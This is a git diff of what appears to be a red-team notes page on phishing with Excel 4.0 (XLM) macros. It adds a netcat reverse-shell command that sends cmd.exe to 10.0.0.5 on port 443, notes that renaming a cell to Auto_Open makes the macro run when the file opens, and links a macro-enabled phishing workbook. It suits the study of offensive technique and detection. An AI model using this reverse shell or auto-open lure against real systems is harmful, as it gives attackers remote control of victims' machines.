@@ -15,9 +15,21 @@ We can then execute command by typing into the cells:
 =halt()
 ```
 
+As always the contents of shel.cmd is a simple NC reverse shell:
+
+{% code-tabs %}
+{% code-tabs-item title="c:\\shell.cmd" %}
+```csharp
+C:\tools\nc.exe 10.0.0.5 443 -e cmd.exe
+```
+{% endcode-tabs-item %}
+{% endcode-tabs %}
+
 Note how we need to rename the `A1` cell to `Auto_Open` if we want the Macros to fire off once the document is opened:
 
 ![](../../.gitbook/assets/phishing-xlm-auto-open.png)
+
+{% file src="../../.gitbook/assets/phishing-xlm.xlsm" caption="XLM Phishing.xlsm" %}
 
 ## Execution
 
